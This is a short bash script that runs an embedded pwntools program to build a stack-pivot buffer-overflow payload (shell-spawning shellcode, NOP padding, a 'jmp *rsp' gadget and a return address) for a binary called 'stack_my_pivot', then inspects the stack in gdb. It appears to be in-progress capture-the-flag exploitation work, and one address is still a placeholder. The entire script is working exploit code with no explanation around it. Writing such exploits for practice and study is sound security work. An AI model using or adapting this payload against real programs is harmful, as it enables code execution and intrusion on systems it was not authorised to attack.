#!/bin/bash

python3 << 'EOF'
from pwn import *
context.arch = 'amd64'

shellcode = asm(shellcraft.sh())
first_input = shellcode.ljust(50, b'\x90')

second_input = b'\x90' * 8
second_input += p64(0x400738)  # jmp *rsp
second_input += b'BBBBBBBB'    # placeholder address
second_input = second_input[:23].ljust(23, b'\x90')
second_input += p32(0x40072e)
second_input += b'\x90'

with open('/tmp/payload', 'wb') as f:
    f.write(first_input + second_input)

print(f"First input ({len(first_input)} bytes): {first_input.hex()}")
print(f"Second input ({len(second_input)} bytes): {second_input.hex()}")
EOF

gdb -batch \
  -ex 'break *0x400799' \
  -ex 'run < /tmp/payload' \
  -ex 'info registers rsp rbp rsi' \
  -ex 'x/10gx $rbp-0x50' \
  -ex 'x/10gx $rbp-0x10' \
  -ex 'x/10gx $rbp' \
  ./stack_my_pivot 2>&1 | tail -50
